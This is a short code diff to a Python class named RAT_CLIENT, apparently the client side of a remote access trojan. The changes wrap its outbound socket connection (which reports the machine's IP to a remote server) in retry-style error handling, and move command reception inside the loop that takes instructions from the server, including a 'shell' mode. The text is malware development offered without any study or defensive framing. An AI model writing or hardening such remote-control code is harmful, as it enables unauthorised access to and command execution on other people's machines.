@@ -47,10 +47,16 @@ class RAT_CLIENT:
 
     def build_connection(self):
         global s
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((self.host, self.port))
-        sending = socket.gethostbyname(socket.gethostname())
-        s.send(sending.encode())
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((self.host, self.port))
+            sending = socket.gethostbyname(socket.gethostname())
+            s.send(sending.encode())
+        except ConnectionRefusedError:
+            print('Server refused connection.')
+            print('Retrying connection...')
+        except:
+            print('Could not connect to server, err unknown.')
 
     def errorsend(self):
         output = bytearray("no output", encoding='utf8')
@@ -94,8 +100,8 @@ class RAT_CLIENT:
 
     def execute(self):
         while True:
-            command = s.recv(2048).decode()
             try:
+                command = s.recv(2048).decode()
                 if command == 'shell':
                     while 1:
                         command = s.recv(2048).decode()
